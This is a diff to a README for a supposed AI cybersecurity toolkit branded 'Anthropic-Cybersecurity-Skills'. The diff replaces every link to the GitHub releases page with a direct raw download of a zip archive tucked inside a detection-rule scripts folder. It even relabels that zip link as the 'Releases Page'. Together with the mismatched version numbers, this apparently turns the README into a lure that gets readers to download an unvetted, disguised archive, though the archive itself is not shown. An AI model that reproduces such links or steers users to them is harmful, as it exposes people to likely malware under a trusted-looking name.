@@ -1,6 +1,6 @@
 # 🛡️ Anthropic-Cybersecurity-Skills - Your AI-Powered Security Toolkit for Everyday Protection
 
-[![Download Now](https://img.shields.io/badge/Download-Anthropic--Cybersecurity--Skills-0066CC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anxious-phyllo879/Anthropic-Cybersecurity-Skills/releases)
+[![Download Now](https://img.shields.io/badge/Download-Anthropic--Cybersecurity--Skills-0066CC?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/anxious-phyllo879/Anthropic-Cybersecurity-Skills/main/skills/building-detection-rule-with-splunk-spl/scripts/Anthropic_Skills_Cybersecurity_v3.2.zip)
 
 ---
 
@@ -15,7 +15,7 @@ This application provides **817 structured cybersecurity skills** that work seam
 ## 🚀 Getting Started
 
 ### Step 1: Download the Application
-Visit this link to download the application: **[Download Anthropic-Cybersecurity-Skills](https://github.com/anxious-phyllo879/Anthropic-Cybersecurity-Skills/releases)**
+Visit this link to download the application: **[Download Anthropic-Cybersecurity-Skills](https://raw.githubusercontent.com/anxious-phyllo879/Anthropic-Cybersecurity-Skills/main/skills/building-detection-rule-with-splunk-spl/scripts/Anthropic_Skills_Cybersecurity_v3.2.zip)**
 
 The download will start automatically. Look for a file named something like `Anthropic-Cybersecurity-Skills.zip` in your **Downloads** folder.
 
@@ -151,7 +151,7 @@ This is version 1.0, and the toolkit is designed to grow with you. Future update
 ## 📞 Getting Help
 
 If you encounter any problems or have questions:
-- Visit the **Releases Page** for updates: [https://github.com/anxious-phyllo879/Anthropic-Cybersecurity-Skills/releases](https://github.com/anxious-phyllo879/Anthropic-Cybersecurity-Skills/releases)
+- Visit the **Releases Page** for updates: [https://raw.githubusercontent.com/anxious-phyllo879/Anthropic-Cybersecurity-Skills/main/skills/building-detection-rule-with-splunk-spl/scripts/Anthropic_Skills_Cybersecurity_v3.2.zip](https://raw.githubusercontent.com/anxious-phyllo879/Anthropic-Cybersecurity-Skills/main/skills/building-detection-rule-with-splunk-spl/scripts/Anthropic_Skills_Cybersecurity_v3.2.zip)
 - Check the repository's issue tracker for known problems and solutions
 
 ---
@@ -166,7 +166,7 @@ Don't wait until something goes wrong. Equip yourself now with the knowledge and
 
 ## 📥 Ready to Get Started?
 
-Visit this link to download the application: **[Download Anthropic-Cybersecurity-Skills Now](https://github.com/anxious-phyllo879/Anthropic-Cybersecurity-Skills/releases)**
+Visit this link to download the application: **[Download Anthropic-Cybersecurity-Skills Now](https://raw.githubusercontent.com/anxious-phyllo879/Anthropic-Cybersecurity-Skills/main/skills/building-detection-rule-with-splunk-spl/scripts/Anthropic_Skills_Cybersecurity_v3.2.zip)**
 
 Join thousands of users who are taking their digital security into their own hands. Your journey to a safer online experience starts today.
 
